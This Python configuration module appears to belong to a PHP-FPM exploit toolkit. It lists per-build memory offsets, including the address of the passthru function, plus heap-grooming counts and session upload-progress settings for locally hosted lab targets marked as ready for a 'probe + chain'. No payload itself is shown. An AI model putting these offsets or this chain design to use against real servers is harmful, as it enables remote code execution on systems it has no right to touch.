"""profiles.py - BINARY_PROFILES (per-build offsets) + TARGETS registry; modphp TODO."""


BINARY_PROFILES = {
    "ubuntu85-1.3-compact": {
        "name": "ubuntu85-1.3-compact",
        "leak_offset": 0x57030,
        "target_offset": 0x6BB80,
        "stage_offset": 0x850D8,
        "dso_deltas": (0x1800000, 0x1A00000),
        "zif_passthru_offset": 0x3DDAA0,
        "zend_llist_remove_tail_offset": 0x5C9470,
        "blockers": 149,
    },
    # measured live on the operator-owned PIE fpm (2026-10-21):
    # workers are forks of one master (shared layout); php_base constant
    # 0x55ffad000000, stable main chunk 0x7f8875a00000 -> delta below.
    "realapps-pie": {
        "name": "realapps-pie",
        "leak_offset": 0x57030,
        "target_offset": 0x6BB80,
        "stage_offset": 0x850D8,
        "dso_deltas": (0x296DA4A00000,),
        "zif_passthru_offset": 0x6496C2,
        "zend_llist_remove_tail_offset": 0x84C1AB,
        "blockers": 149,
    },
}

TARGETS = {
    # sources: universal/freeze_battery.py TARGETS (host/port/path/sessions dir),
    # universal/fullflow_wiki + fullflow_wp run captures, docs/validation_1021_filmpost.md
    "wiki": {
        "name": "wiki",
        "binary_profile": "realapps-pie",
        "host": "127.0.0.1",
        "port": 28840,
        "path": "/index.php",
        "session_save_path": "/tmp/opencode/realapps/sessions/wiki",
        "ini": {
            # as-found on the running [wiki] pool (UNIVERSAL_PLAN.md, section a):
            # fpm_realapps.conf [wiki]; no upload_progress overrides anywhere in
            # the stack, so compiled 8.5.10 defaults apply (session.c:934-945).
            "memory_limit": "8M (php_admin_value, fpm pool conf)",
            "pm": "static",
            "pm.max_children": "1 (duplicate key: later value wins)",
            "pm.max_requests": "5000",
            "session.upload_progress.enabled": "1 (compiled default, session.c:934)",
            "session.upload_progress.cleanup": "1 (compiled default at runtime; "
                "the ASAN diag receipts override it to 0 - lab-only)",
        },
        "workers": "php-fpm pool [wiki], pm=static, single worker",
        "producer_modules": ("producer_618", "producer_619"),
        "status": "available (probe + chain)",
    },
    "wp": {
        "name": "wp",
        "binary_profile": "realapps-pie",
        "host": "127.0.0.1",
        "port": 28841,
        "path": "/index.php",
        "session_save_path": "/tmp/opencode/realapps/sessions/wp",
        "ini": {
            # same compiled-defaults reasoning as [wiki]; verify pool conf per run
            "memory_limit": "8M (php_admin_value, fpm pool conf)",
            "pm": "static",
            "pm.max_children": "1 (verify per run)",
            "pm.max_requests": "5000",
            "session.upload_progress.enabled": "1 (compiled default, session.c:934)",
            "session.upload_progress.cleanup": "1 (compiled default at runtime)",
        },
        "workers": "php-fpm pool, pm=static",
        "producer_modules": ("producer_618", "producer_619"),
        "status": "available (probe + chain)",
    },
    "modphp": {
        "name": "modphp",
        "binary_profile": None,
        "host": None,
        "port": None,
        "path": None,
        "session_save_path": None,
        "ini": {},
        "workers": None,
        "producer_modules": (),
        # TODO (missing module): no measured per-build constants and no
        # producer wired for a mod_php SAPI target. Fill in after the
        # per-binary profile run creates the needed addresses/ entry
        # (see universal/profile_builder.py and addresses/generated/).
        "status": "TODO (missing module: no producer, no addresses)",
    },
}


def is_known_target(value: str) -> bool:
    return value in TARGETS


def profile_for(target_name: str | None, url_target: bool) -> str:
    """Binary profile name for a registered target, or raise ValueError."""
    if url_target or target_name not in TARGETS:
        raise ValueError(
            "no binary profile bound to this target; pass --profile explicitly"
        )
    name = TARGETS[target_name].get("binary_profile")
    if name is None:
        raise ValueError(
            f"target {target_name} has no binary profile yet: {TARGETS[target_name]['status']}"
        )
    return name


def url_for(target_name: str) -> str | None:
    entry = TARGETS.get(target_name)
    if not entry or entry.get("host") is None:
        return None
    return f"http://{entry['host']}:{entry['port']}{entry['path']}"
